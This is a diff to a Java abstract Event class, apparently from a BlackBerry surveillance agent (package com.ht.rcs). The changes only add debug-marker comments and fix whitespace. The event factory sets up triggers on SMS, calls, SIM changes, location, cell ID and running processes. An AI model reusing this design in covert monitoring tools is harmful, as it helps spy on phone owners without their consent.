@@ -20,7 +20,7 @@ import com.ht.rcs.blackberry.utils.Utils;
  */
 public abstract class Event extends StartStopThread {
 
-    /** The debug. */
+    /** The debug instance. */
     private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);
 
     /** The Constant EVENT. */
@@ -74,8 +74,6 @@ public abstract class Event extends StartStopThread {
     /** The status obj. */
     protected Status statusObj = null;
 
-
-
     /**
      * Factory.
      * 
@@ -95,50 +93,62 @@ public abstract class Event extends StartStopThread {
 
         switch (eventType) {
         case EVENT_TIMER:
+            // #debug
             debug.trace("Factory EVENT_TIMER");
             event = new TimerEvent(actionId, confParams);
             break;
         case EVENT_SMS:
+            // #debug
             debug.trace("Factory EVENT_SMS");
             event = new SmsEvent(actionId, confParams);
             break;
         case EVENT_CALL:
+            // #debug
             debug.trace("Factory EVENT_CALL");
             event = new CallEvent(actionId, confParams);
             break;
         case EVENT_CONNECTION:
+            // #debug
             debug.trace("Factory EVENT_CONNECTION");
             event = new ConnectionEvent(actionId, confParams);
             break;
         case EVENT_PROCESS:
+            // #debug
             debug.trace("Factory EVENT_PROCESS");
             event = new ProcessEvent(actionId, confParams);
             break;
         case EVENT_CELLID:
+            // #debug
             debug.trace("Factory EVENT_CELLID");
             event = new CellIdEvent(actionId, confParams);
             break;
         case EVENT_QUOTA:
+            // #debug
             debug.trace("Factory EVENT_QUOTA");
             event = new QuotaEvent(actionId, confParams);
             break;
         case EVENT_SIM_CHANGE:
+            // #debug
             debug.trace("Factory EVENT_SIM_CHANGE");
             event = new SimChangeEvent(actionId, confParams);
             break;
         case EVENT_LOCATION:
+            // #debug
             debug.trace("Factory EVENT_LOCATION");
             event = new LocationEvent(actionId, confParams);
             break;
         case EVENT_AC:
+            // #debug
             debug.trace("Factory EVENT_AC");
             event = new AcEvent(actionId, confParams);
             break;
         case EVENT_BATTERY:
+            // #debug
             debug.trace("Factory EVENT_BATTERY");
             event = new BatteryEvent(actionId, confParams);
             break;
         default:
+            // #debug
             debug.error("Factory Unknown type:" + eventType);
             return null;
         }
@@ -161,7 +171,7 @@ public abstract class Event extends StartStopThread {
 
         this.eventType = eventType_;
         this.actionId = actionId_;
-        
+
         enable(true);
     }
 
@@ -179,7 +189,7 @@ public abstract class Event extends StartStopThread {
         this(eventType_, actionId_);
         parse(confParams);
     }
-  
+
     /**
      * Parses the.
      * 
@@ -189,7 +199,6 @@ public abstract class Event extends StartStopThread {
      */
     protected abstract boolean parse(byte[] confParams);
 
-  
     public String toString() {
         return "Event:" + eventType + "|" + eventId;
 
